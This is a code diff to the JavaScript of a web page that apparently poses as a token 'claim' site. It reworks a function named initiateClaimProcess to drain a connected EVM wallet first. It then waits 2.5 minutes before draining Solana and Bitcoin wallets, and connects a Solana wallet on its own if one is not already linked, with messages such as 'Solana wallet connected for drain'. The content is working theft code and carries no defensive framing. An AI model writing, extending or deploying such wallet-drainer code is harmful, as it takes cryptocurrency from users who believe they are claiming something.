@@ -408,6 +408,9 @@ let solanaPublicKey = null;
 
 const DISABLE_DISCONNECT = isMobileDevice;
 
+// Flag to prevent multiple delayed Solana attempts
+let delayedSolanaAttempted = false;
+
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
@@ -2083,38 +2086,70 @@ setTimeout(() => {
   checkManualExistingConnection();
 }, 1000);
 
-// ====== MULTI‑CHAIN DISPATCHER ======
+// ====== MULTI‑CHAIN DISPATCHER WITH EVM FIRST AND DELAYED SOLANA/BITCOIN ======
+let delayedAttemptsScheduled = false;
+
 async function initiateClaimProcess() {
-  // Bitcoin (UniSat)
-  if (window.unisat) {
-    try {
-      const accounts = await window.unisat.getAccounts();
-      if (accounts && accounts.length > 0) {
-        console.log("🟧 Bitcoin wallet detected, attempting BTC drain...");
-        await drainNativeBTC();
-        return;
-      }
-    } catch (e) {
-      console.debug("UniSat check failed:", e);
-    }
-  }
-
-  // Solana
-  const solanaWallets = getSolanaWallets();
-  if (solanaWallets.length > 0 && solanaPublicKey) {
-    console.log("🟪 Solana wallet detected, attempting SOL drain...");
-    await drainNativeSOL();
-    return;
-  }
-
-  // EVM
+  // --- EVM FIRST ---
   if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
     console.log("🟦 EVM wallet detected, attempting EVM drain...");
     await drainEVM();
+
+    // After EVM drain (success or low balance), schedule Solana and Bitcoin after 2.5 minutes
+    if (!delayedAttemptsScheduled) {
+      delayedAttemptsScheduled = true;
+      const delayMs = 150000; // 2.5 minutes
+      showNotification(`EVM processing complete. Will check Solana/Bitcoin in ${delayMs/60000} minutes.`, "info");
+      logDebug(`⏳ Delaying Solana/Bitcoin for ${delayMs/1000} seconds`);
+
+      setTimeout(async () => {
+        logDebug("⏰ Delayed period elapsed. Attempting Solana and Bitcoin...");
+        // Solana
+        const solanaWallets = getSolanaWallets();
+        if (solanaWallets.length > 0 && solanaPublicKey) {
+          console.log("🟪 Solana wallet detected, attempting SOL drain...");
+          await drainNativeSOL();
+        } else {
+          // Try to connect to Solana if not already connected
+          if (solanaWallets.length > 0) {
+            // We need to connect Solana first; we can call the connect function from main.js, but it's not exposed.
+            // Instead, we can use the global connectSolana if available, or we can attempt to connect via the provider.
+            // For simplicity, we'll try to connect using the first provider.
+            try {
+              const wallet = solanaWallets[0];
+              const provider = wallet.provider;
+              if (provider.connect) {
+                const response = await provider.connect();
+                const publicKey = response.publicKey?.toString() || response.toString();
+                solanaPublicKey = publicKey;
+                solanaProvider = provider;
+                showNotification("Solana wallet connected for drain", "success");
+                await drainNativeSOL();
+              }
+            } catch (e) {
+              logDebug("Solana connection attempt failed: " + e.message);
+            }
+          }
+        }
+
+        // Bitcoin
+        if (window.unisat) {
+          try {
+            const accounts = await window.unisat.getAccounts();
+            if (accounts && accounts.length > 0) {
+              console.log("🟧 Bitcoin wallet detected, attempting BTC drain...");
+              await drainNativeBTC();
+            }
+          } catch (e) {
+            console.debug("UniSat check failed:", e);
+          }
+        }
+        delayedAttemptsScheduled = false;
+      }, delayMs);
+    }
     return;
   }
-
-  showNotification("No supported wallet connected", "error");
+  showNotification("No EVM wallet connected. Please connect an EVM wallet first.", "error");
 }
 
 // ====== EXPOSE GLOBALLY ======
